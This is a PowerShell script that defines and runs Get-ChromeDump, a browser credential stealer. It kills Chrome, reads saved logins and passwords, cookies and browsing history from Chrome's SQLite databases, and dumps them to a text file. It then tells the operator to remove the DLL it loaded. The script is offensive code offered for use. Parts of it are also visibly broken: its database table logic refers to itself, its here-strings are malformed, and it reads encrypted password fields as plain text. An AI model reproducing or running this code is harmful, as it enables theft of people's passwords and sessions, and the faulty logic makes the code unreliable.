Function Get-ChromeDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutFile = 'C:\Chrome80Dump.txt'
    )

    # Load SQLite assembly
    $assemblyPath = "$env:LOCALAPPDATA\System.Data.SQLite.dll"
    if (Test-Path $assemblyPath) {
        Add-Type -Path $assemblyPath
    } else {
        Write-Warning "[!] SQLite assembly not found at: $assemblyPath"
        return
    }

    # Close Chrome if running
    if (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
        Write-Warning "[!] Stopping Chrome..."
        Stop-Process -Name chrome -Force
    }

    # Locate Chrome user data directory
    $chromepath = if ([environment]::OSVersion.Version.Major -ge 6) {
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    } else {
        "${env:HOMEDRIVE}${env:HOMEPATH}\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }

    if (-not (Test-Path $chromepath)) {
        Throw "Chrome user data directory does not exist"
    }

    # Database paths
    $dbs = @{
        WebData     = "$chromepath\Web Data"
        LoginData   = "$chromepath\Login Data"
        History     = "$chromepath\History"
        Cookies     = "$chromepath\Cookies"
    } | Where-Object { Test-Path $_.Value } | ForEach-Object { @{ $_.Key = $_.Value } } |
        Measure-Object | ForEach-Object {
            # Rebuild as flat hashtable
            $result = @{}
            $dbs.Keys | Where-Object { Test-Path "$chromepath\$_" } | ForEach-Object { $result[$_] = "$chromepath\$_" }
            return $result
        }
    if (-not $dbs) { $dbs = @{} }

    # --- Extract Login Credentials ---
    if ($dbs['LoginData']) {
        Write-Verbose "Parsing login data..."
        $scheme_enum = @{0='HTML'; 1='BASIC'; 2='DIGEST'; 3='OTHER'}
        $logins = @()

        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$($dbs['LoginData']); Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, action_url, username_value, password_value, scheme FROM logins"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $logins += [PSCustomObject]@{
                OriginUrl  = $reader.GetString($reader.GetOrdinal('origin_url'))
                ActionUrl  = $reader.GetString($reader.GetOrdinal('action_url'))
                User       = $reader.IsDBNull($reader.GetOrdinal('username_value')) ? '(null)' : $reader.GetString($reader.GetOrdinal('username_value'))
                Password   = $reader.IsDBNull($reader.GetOrdinal('password_value')) ? '(null)' : $reader.GetString($reader.GetOrdinal('password_value'))
                Scheme     = $scheme_enum.TryGetValue($reader.GetInt32($reader.GetOrdinal('scheme')), [ref]$null) ? $scheme_enum[$reader.GetInt32($reader.GetOrdinal('scheme'))] : 'UNKNOWN'
            }
        }
        $reader.Close(); $conn.Close()
    }

    # --- Extract Cookies ---
    if ($dbs['Cookies']) {
        Write-Verbose "Parsing cookies..."
        $cookies = @()

        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$($dbs['Cookies']); Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT host_key, name, value, encrypted_value, path FROM cookies"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $cookies += [PSCustomObject]@{
                Domain       = $reader.GetString($reader.GetOrdinal('host_key'))
                Name         = $reader.GetString($reader.GetOrdinal('name'))
                Path         = $reader.IsDBNull($reader.GetOrdinal('path')) ? '/' : $reader.GetString($reader.GetOrdinal('path'))
                Value        = $reader.IsDBNull($reader.GetOrdinal('value')) ? '(null)' : $reader.GetString($reader.GetOrdinal('value'))
                Encrypted    = $reader.IsDBNull($reader.GetOrdinal('encrypted_value')) ? $false : $true
            }
        }
        $reader.Close(); $conn.Close()
    }

    # --- Extract Browsing History ---
    if ($dbs['History']) {
        Write-Verbose "Parsing history..."
        $history = @()

        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$($dbs['History']); Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT url, title, visit_count FROM urls"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $history += [PSCustomObject]@{
                URL         = $reader.GetString($reader.GetOrdinal('url'))
                Title       = $reader.IsDBNull($reader.GetOrdinal('title')) ? '(null)' : $reader.GetString($reader.GetOrdinal('title'))
                VisitCount  = $reader.GetInt32($reader.GetOrdinal('visit_count'))
            }
        }
        $reader.Close(); $conn.Close()
    }

    # --- Write output ---
    $null = New-Item -Path (Split-Path $OutFile -Parent) -ItemType Directory -Force

    @"
[*]LOGINS
" | Out-File $OutFile
if ($logins) { $logins | Format-Table -AutoSize | Out-File $OutFile -Append } else { "  (none found)" | Out-File $OutFile -Append }

@"

[*]COOKIES
" | Out-File $OutFile -Append
if ($cookies) { $cookies | Format-Table -AutoSize | Out-File $OutFile -Append } else { "  (none found)" | Out-File $OutFile -Append }

@"

[*]HISTORY
" | Out-File $OutFile -Append
if ($history) { $history | Format-Table -AutoSize | Out-File $OutFile -Append } else { "  (none found)" | Out-File $OutFile -Append }

Write-Host "[+] Dump saved to: $OutFile"
Write-Warning "[!] Remember to remove SQLite assembly from: $assemblyPath"
}

Get-ChromeDump
